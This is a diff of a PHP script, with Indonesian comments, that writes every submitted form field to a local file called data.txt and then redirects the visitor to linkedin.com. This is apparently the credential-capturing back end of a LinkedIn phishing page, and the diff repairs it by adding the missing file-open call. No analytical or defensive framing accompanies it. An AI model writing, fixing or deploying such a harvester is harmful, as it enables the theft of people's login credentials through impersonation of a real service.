@@ -1,18 +1,17 @@
 <?php
-header
-('location:');
+$handle = fopen("data.txt", "a"); // Ubah "data.txt" sesuai dengan nama file yang ingin Anda gunakan untuk menyimpan data
+
 if ($handle) {
-     foreach($_POST as $variable=>$value) {
-       fwrite($handle,$variable);
-       fwrite($handle,",");
-       fwrite($handle,$value);
-       fwrite($handle,"\r\n");
-     }
-     fwrite($handle,"\r\n");
-     fclose($handle);
-   } else {
-     // Tindakan jika file tidak berhasil dibuka
-   };
-header("location:https://www.linkedin.com/");
+  foreach ($_POST as $variable => $value) {
+    fwrite($handle, $variable . ",");
+    fwrite($handle, $value . "\r\n");
+  }
+  fwrite($handle, "\r\n");
+  fclose($handle);
+} else {
+  // Tindakan jika file tidak berhasil dibuka
+}
+
+header("Location: https://www.linkedin.com/");
 exit;
 ?>
